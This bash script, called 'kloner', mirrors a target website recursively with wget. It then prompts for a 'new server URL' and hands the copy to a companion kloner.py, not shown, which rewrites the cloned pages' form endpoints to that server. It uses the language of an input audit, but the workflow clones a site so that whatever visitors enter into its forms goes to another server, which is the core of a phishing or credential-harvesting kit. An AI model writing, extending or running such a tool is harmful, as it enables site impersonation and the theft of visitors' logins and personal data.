#!/usr/bin/env bash

# ==============================================================================
# Tool Name   : kloner (Upgraded with Input Zone & Destination Audit)
# Description : Interactive CLI wrapper around wget for recursive website mirroring,
#               followed by automated input zone detection and endpoint rewriting.
# ==============================================================================

# --- Terminal Color Definitions ---
RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
BOLD='\033[1m'
NC='\033[0m' # Reset Color

EXPORT_BASE="./downloaded"
DEFAULT_OUTPUT_DIR="changed"

# --- Function: Display Banner ---
show_banner() {
    clear
    echo -e "${CYAN}${BOLD}"
    cat << "EOF"
  _    _                       
 | | _| | ___  _ __   ___ _ __ 
 | |/ / |/ _ \| '_ \ / _ \ '__|
 |   <| | (_) | | | |  __/ |   
 |_|\_\_|\___/|_| |_|\___|_|   
                               
   [ Recursive Archiver & Input Zone Detection Pipeline ]
EOF
    echo -e "${NC}"
    echo -e "${BLUE}============================================================${NC}"
}

# --- Function: Check Required Dependencies ---
check_dependencies() {
    echo -e "${YELLOW}[*] Checking required system dependencies...${NC}"
    
    if command -v wget >/dev/null 2>&1; then
        echo -e "${GREEN}[+] Found: wget (Mirroring engine)${NC}"
    else
        echo -e "${RED}[!] Error: 'wget' is not installed. Install it via: sudo apt install wget${NC}"
        exit 1
    fi

    if command -v python3 >/dev/null 2>&1; then
        echo -e "${GREEN}[+] Found: python3 (Pipeline execution engine)${NC}"
    else
        echo -e "${RED}[!] Error: 'python3' is not installed.${NC}"
        exit 1
    fi
    
    echo -e "${BLUE}============================================================${NC}\n"
}

# --- Main Execution Flow ---
show_banner
check_dependencies

# 1. User Input: Target URL
read -r -p "$(echo -e "${BOLD}Enter Target URL (e.g., https://example.com): ${NC}")" TARGET_URL

if [[ -z "$TARGET_URL" ]]; then
    echo -e "${RED}[!] Error: Target URL cannot be empty.${NC}"
    exit 1
fi

if [[ ! "$TARGET_URL" =~ ^https?:// ]]; then
    TARGET_URL="https://$TARGET_URL"
    echo -e "${YELLOW}[i] Protocol omitted. Defaulting to: ${TARGET_URL}${NC}"
fi

DOMAIN=$(echo "$TARGET_URL" | awk -F/ '{print $3}')

# 2. User Input: Recursion Depth
read -r -p "$(echo -e "${BOLD}Enter Recursion Depth (e.g., 4 for 4 levels deep) [Default: 2]: ${NC}")" DEPTH
DEPTH=${DEPTH:-2}

if ! [[ "$DEPTH" =~ ^[0-9]+$ ]]; then
    echo -e "${RED}[!] Error: Depth must be a positive integer.${NC}"
    exit 1
fi

# 3. User Input: New Server URL for Input Redirection
echo -e "\n${BLUE}------------------------------------------------------------${NC}"
echo -e "${BOLD}Pipeline Configuration (Input Audit & Endpoint Rewriting)${NC}"
echo -e "${BLUE}------------------------------------------------------------${NC}"
read -r -p "$(echo -e "${BOLD}Enter New Server URL to redirect form inputs (e.g., http://192.168.1.50:8080): ${NC}")" NEW_SERVER_URL

TARGET_DIR="${EXPORT_BASE}/${DOMAIN}"
mkdir -p "$TARGET_DIR"

echo -e "\n${BLUE}============================================================${NC}"
echo -e "${CYAN}[*] Target URL      :${NC} $TARGET_URL"
echo -e "${CYAN}[*] Recursion Depth :${NC} $DEPTH"
echo -e "${CYAN}[*] Raw Export Path :${NC} $TARGET_DIR"
if [[ -n "$NEW_SERVER_URL" ]]; then
    echo -e "${CYAN}[*] New Server Target:${NC} $NEW_SERVER_URL"
fi
echo -e "${BLUE}============================================================${NC}\n"

echo -e "${YELLOW}[*] Starting clone process using wget...${NC}\n"

wget \
    --recursive \
    --level="$DEPTH" \
    --page-requisites \
    --adjust-extension \
    --convert-links \
    --restrict-file-names=windows \
    --domains "$DOMAIN" \
    --no-parent \
    --no-host-directories \
    --directory-prefix="$TARGET_DIR" \
    --user-agent="Mozilla/5.0 (X11; Linux x86_64) KlonerArchiver/1.0" \
    --show-progress \
    "$TARGET_URL"

WGET_STATUS=$?

echo -e "\n${GREEN}[+] Raw download finished with status code $WGET_STATUS.${NC}"

# 4. Automatically trigger Python Input Audit & Rewrite Pipeline
if [[ -n "$NEW_SERVER_URL" ]]; then
    echo -e "\n${YELLOW}[*] Triggering Python Input Zone Inspector & Endpoint Pipeline...${NC}"
    
    if [[ -f "./kloner.py" ]]; then
        python3 kloner.py "$TARGET_DIR" \
            --new-url "$NEW_SERVER_URL" \
            --base-url "$TARGET_URL" \
            --output-dir "$DEFAULT_OUTPUT_DIR" \
            --keep-path \
            --js
            
        echo -e "\n${GREEN}[+] Workflow complete! Input zones audited and ready in: ${BOLD}./${DEFAULT_OUTPUT_DIR}/${NC}"
    else
        echo -e "${RED}[!] Warning: 'kloner.py' not found in current directory.${NC}"
        echo -e "${YELLOW}[i] The raw files remain safely inside: ${TARGET_DIR}${NC}"
        echo -e "${YELLOW}[i] Please place your updated kloner.py script alongside this file.${NC}"
    fi
else
    echo -e "${YELLOW}[i] No new server URL provided. Skipping input audit and endpoint rewrite pipeline.${NC}"
    echo -e "${GREEN}[+] Cloned files are available in: ${BOLD}${TARGET_DIR}${NC}"
fi